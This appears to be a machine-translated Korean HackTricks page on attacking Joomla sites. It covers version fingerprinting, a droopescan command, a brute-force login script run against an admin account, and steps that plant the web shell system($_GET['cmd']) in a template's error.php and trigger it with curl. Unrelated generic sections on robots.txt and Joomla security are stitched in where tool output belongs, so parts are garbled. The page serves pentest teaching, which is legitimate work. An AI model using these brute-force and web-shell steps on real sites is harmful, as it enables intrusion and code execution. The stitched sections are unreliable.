# Joomla

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해보세요.

</details>

### Joomla 통계

Joomla는 Joomla 설치에서 사용되는 Joomla, PHP 및 데이터베이스 버전 및 서버 운영 체제와 같은 익명의 [사용 통계](https://developer.joomla.org/about/stats.html)를 수집합니다. 이 데이터는 공개 [API](https://developer.joomla.org/about/stats/api.html)를 통해 쿼리할 수 있습니다.
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## 열거

### 발견/풋프린팅

* **메타**를 확인하세요.
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
# robots.txt

`robots.txt` 파일은 웹 사이트의 검색 엔진 크롤러에게 특정 페이지 또는 디렉토리에 대한 액세스 권한을 제어하는 데 사용됩니다. 이 파일은 일반적으로 웹 사이트의 루트 디렉토리에 위치하며, 크롤러가 웹 사이트를 방문할 때 해당 규칙을 따라야 합니다.

## 문법

`robots.txt` 파일은 다음과 같은 구문을 따릅니다.

```
User-agent: [크롤러 이름]
Disallow: [액세스 제한할 디렉토리 또는 페이지]
```

여러 개의 `User-agent` 및 `Disallow` 지시문을 사용하여 여러 크롤러 및 디렉토리 또는 페이지에 대한 액세스 권한을 제어할 수 있습니다.

## 예제

다음은 `robots.txt` 파일의 예제입니다.

```plaintext
User-agent: *
Disallow: /admin/
Disallow: /private/
Disallow: /secret-page.html
```

위의 예제에서는 모든 크롤러(`*`)에게 `/admin/`, `/private/` 디렉토리 및 `/secret-page.html` 페이지에 대한 액세스를 제한하도록 지시합니다.

## 주의사항

- `robots.txt` 파일은 크롤러에게 액세스 제한을 요청하는 것이지, 보안 기능이 아닙니다. 따라서 중요한 정보를 포함하는 디렉토리나 페이지를 숨기기 위해 `robots.txt` 파일만 사용해서는 안 됩니다.
- 일부 크롤러는 `robots.txt` 파일을 무시할 수 있으므로, 중요한 정보를 보호하기 위해서는 추가적인 보안 조치가 필요합니다.
- `robots.txt` 파일은 공개적으로 액세스 가능하므로, 중요한 정보를 포함하지 않도록 주의해야 합니다.
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

# Joomla

## 개요

Joomla는 인기있는 오픈 소스 콘텐츠 관리 시스템(CMS)입니다. Joomla는 PHP로 작성되었으며, 사용자가 웹 사이트를 만들고 관리할 수 있도록 도와줍니다. Joomla는 다양한 기능과 확장성을 제공하며, 사용자 친화적인 인터페이스를 가지고 있습니다.

## 취약점 분석

### 1. 디렉토리 탐색

디렉토리 탐색 취약점은 공격자가 웹 서버의 파일 시스템에 액세스하여 중요한 파일을 탐색할 수 있는 취약점입니다. Joomla에서는 디렉토리 탐색 취약점이 발생할 수 있으므로, 웹 서버의 파일 시스템에 대한 액세스 권한을 제한하는 것이 중요합니다.

### 2. SQL 인젝션

SQL 인젝션은 악의적인 SQL 쿼리를 삽입하여 데이터베이스에 대한 액세스 권한을 얻는 취약점입니다. Joomla에서는 사용자 입력을 적절하게 필터링하고 이스케이프하여 SQL 인젝션을 방지해야 합니다.

### 3. 크로스 사이트 스크립팅(XSS)

크로스 사이트 스크립팅은 악의적인 스크립트를 삽입하여 사용자의 브라우저에서 실행되도록 하는 취약점입니다. Joomla에서는 사용자 입력을 적절하게 이스케이프하여 크로스 사이트 스크립팅을 방지해야 합니다.

### 4. 파일 업로드 취약점

파일 업로드 취약점은 악의적인 파일을 업로드하여 웹 서버에 액세스하거나 실행할 수 있는 취약점입니다. Joomla에서는 파일 업로드 시 적절한 파일 유형 및 크기 제한을 설정하여 파일 업로드 취약점을 방지해야 합니다.

## 보안 강화

Joomla의 보안을 강화하기 위해 다음 조치를 취할 수 있습니다.

1. 항상 최신 버전의 Joomla를 사용하십시오.
2. 보안 패치 및 업데이트를 정기적으로 적용하십시오.
3. 사용자 입력을 적절하게 필터링하고 이스케이프하여 취약점을 방지하십시오.
4. 파일 업로드 시 적절한 파일 유형 및 크기 제한을 설정하십시오.
5. 웹 서버의 파일 시스템에 대한 액세스 권한을 제한하십시오.

## 추가 자료

- [Joomla 공식 웹사이트](https://www.joomla.org/)
- [Joomla 보안 가이드](https://docs.joomla.org/Category:Security_Checklist)
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### 버전

* **/administrator/manifests/files/joomla.xml**에서 버전을 확인할 수 있습니다.
* **/language/en-GB/en-GB.xml**에서 Joomla의 버전을 얻을 수 있습니다.
* **plugins/system/cache/cache.xml**에서 대략적인 버전을 확인할 수 있습니다.

### 자동화된 방법
```bash
droopescan scan joomla --url http://joomla-site.local/
```
In[ **80,443 - 웹 펜테스팅 방법론**](./#cms-scanners) 섹션에는 Joomla를 스캔할 수 있는 CMS 스캐너가 있습니다.

### 브루트 포스

[이 스크립트](https://github.com/ajnik/joomla-bruteforce)를 사용하여 로그인을 브루트 포스 공격할 수 있습니다.
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE (원격 코드 실행)

만약 **관리자 자격 증명**을 획득했다면, **PHP 코드 스니펫**을 추가하여 **RCE를 실행**할 수 있습니다. 이를 위해 **템플릿**을 **사용자 정의**할 수 있습니다.

1. `Configuration` 아래의 왼쪽 하단에 있는 **`Templates`**를 클릭하여 템플릿 메뉴를 엽니다.
2. `Template` 열 헤더 아래에서 **`protostar`**를 선택하여 **템플릿** 이름을 클릭합니다. 이렇게 하면 **`Templates: Customise`** 페이지로 이동합니다.
3. 마지막으로, **페이지 소스**를 가져오기 위해 페이지를 클릭합니다. **`error.php`** 페이지를 선택해 보겠습니다. 다음과 같이 **PHP 한 줄 코드 실행**을 위해 **PHP 한 줄 코드를 추가**합니다:
1. **`system($_GET['cmd']);`**
4. **저장 및 닫기**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
